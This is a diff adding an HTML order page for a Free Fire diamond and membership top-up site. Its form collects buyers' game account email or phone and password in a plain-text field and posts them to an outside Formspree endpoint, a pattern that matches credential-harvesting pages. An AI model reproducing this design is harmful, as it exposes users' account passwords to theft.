@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="bootstrap.css">
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <title>Contact-Black Pink Topup Zone</title>
+  </head>
+  <body>
+    
+    <!-- ============NAVIGATION    BAR======= -->
+    <nav class="navbar navbar-expand-lg  navbar-dark bg-dark">
+      <a class="navbar-brand navbar-logo" href="index.html">Black-Pink Topup</a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav mr-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="index.html">HOME <span class="sr-only">(current)</span></a>
+            <li class="nav-item dropdown active">
+              <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                FREEFIRE TOPUP
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                <a class="dropdown-item" href="freefiretopup.html">Freefire Topup</a>
+                <div class="dropdown-divider"></div>
+              </div>
+            </li>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link disabled" href="articles.html">ARTICLES</a>
+          </li>
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="more-list" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+              MORE+
+            </a>
+            <div class="dropdown-menu" aria-labelledby="more-list">
+              <a class="dropdown-item" href="about.html">ABOUT</a>
+              <a class="dropdown-item" href="contact.html">CONTACT US</a>
+              <div class="dropdown-divider"></div>
+              <a class="dropdown-item disabled" href="reviews.html">REVIEWS</a>
+            </div>
+          </li>
+          
+          
+          
+          
+        </ul>
+        <form class="nav-form form-inline my-2 my-lg-0">
+          <input class="form-control mr-sm-2" type="search" placeholder="Search" aria-label="Search">
+          <button class="btn btn-outline-success my-2 my-sm-0" type="submit">Search</button>
+        </form>
+      </div>
+    </nav>
+    
+    
+    <form action="https://formspree.io/f/xleodpwv" method="POST" class="freefire-topup-form container lg my-5" onsubmit="return confirm('Do you really want to submit the form?');">
+      <h1 class="mb-2">Freefire Topup</h1>
+      <hr>
+      <h5 class="text-muted" >Please fill the form as per your Purchase need.</h5>
+      <h6 class="mb-5 text-muted">We will we would deliver the service instantly.</h6>
+      <div class="row">
+        <div class="form-group col-md-6">
+          <label for="firstName">First Name</label>
+          <input type="text" name="First_Name" class="form-control" id="firstName" placeholder="John" required>
+        </div>
+        <div class="form-group col-md-6">
+          <label for="lastName">Last Name</label>
+          <input type="text" name="Last_Name" class="form-control" id="lastName" placeholder="Doe" required>
+        </div>
+      </div>
+      <div class="row">
+        <div class="form-group col-md-6">
+          <label for="email">Email address</label>
+          <input type="email" name="E_mail" class="form-control" id="email" placeholder="name@example.com" required>
+        </div>
+        <div class="form-group col-md-6">
+          <label for="phoneNumber">Phone no.</label>
+          <input type="text" name="Phone_no." class="form-control" id="phoneNumber" placeholder="9877777777">
+        </div>
+      </div>
+      <div class="row">
+        <div class="form-group col-md-6 my-1">
+          <label class="mr-sm-2" for="purchaseType">Select Purchase Type</label>
+          <select name="Purchase_Type" class="custom-select mr-sm-2" id="purchaseType" onchange="diamond()" required>
+            <option value="nothing" selected hidden disabled>Click here to choose...</option>
+            <option value="Diamond_Topup">Diamond Topup</option>
+            <option value="Membership">Membership</option>
+          </select>
+        </div>
+        <div class="form-group col-md-6 my-1 d-none" id="diamondList">
+          <label class="mr-sm-2" for="diamondLists">Select no. of diamonds</label>
+          <select name="Diamonds" class="custom-select mr-sm-2" id="diamondLists" onchange="priceListDiamond()">
+            <option value="100_Diamonds" selected>100 Diamonds</option>
+            <option value="200_Diamonds">200 Diamonds</option>
+            <option value="310_Diamonds">310 Diamonds</option>
+            <option value="410_Diamonds">410 Diamonds</option>
+            <option value="200_Diamonds">200 Diamonds</option>
+            <option value="520_Diamonds">520 Diamonds</option>
+            <option value="620_Diamonds">620 Diamonds</option>
+            <option value="720_Diamonds">720 Diamonds</option>
+            <option value="830_Diamonds">830 Diamonds</option>
+            <option value="930_Diamonds">930 Diamonds</option>
+            <option value="1060_Diamonds">1060 Diamonds</option>
+            <option value="2180_Diamonds">2180 Diamonds</option>
+          </select>
+        </div>
+        <div class="form-group col-md-6 my-1 d-none" id="membershipType">
+          <label class="mr-sm-2" for="membershipTypes">Select Membership Type</label>
+          <select name="Membership_Type" class="custom-select mr-sm-2" id="membershipTypes" onchange="priceListMembership()">
+            <option value="Weekly_Membership" selected>Weekly Membership</option>
+            <option value="Monthly_Membership">Monthly Membership</option>
+          </select>
+        </div>
+        
+      </div>
+      <div class="row">
+        <div class="form-group col-md-6 mt-3">
+          <label for="ffCost">Your cost appears here</label>
+          <input type="text" class="form-control" id="ffCost" readonly>
+        </div>
+        
+        <div class="form-group col-md-6">
+          
+        </div>
+      </div>
+      <h4 class="text-muted mt-5">Game ID Information</h4>
+      <hr>
+      <div class="row">
+        <div class="form-group col-md-6">
+          <label for="emailPhone">E-mail/Phone no.</label>
+          <input type="text" name="Username" class="form-control" id="emailPhone" required onclick="ensure()">
+        </div>
+        <div class="form-group col-md-6">
+          <label for="password">Password</label>
+          <input type="text" name="Password" class="form-control" id="password" autocomplete="off" required onclick="ensure()">
+        </div>
+      </div>
+      <p class="text-muted">Note: Please change password after you receive your diamonds or membership.</p>
+      <hr>
+      <div class="form-group">
+        <label for="exampleFormControlTextarea1">Any Queries?</label>
+        <textarea class="form-control" id="exampleFormControlTextarea1" rows="6" placeholder="Elaborate your Query here...."></textarea>
+      </div>
+      <div class="container">
+        <button class="btn btn-primary btn-lg" id="ffTopupSubmit" type="submit" >Submit form</button>
+      </div>
+    </form>
+    
+    <!-- Optional JavaScript -->
+    <script src="script.js"></script>
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+  </body>
+</html>
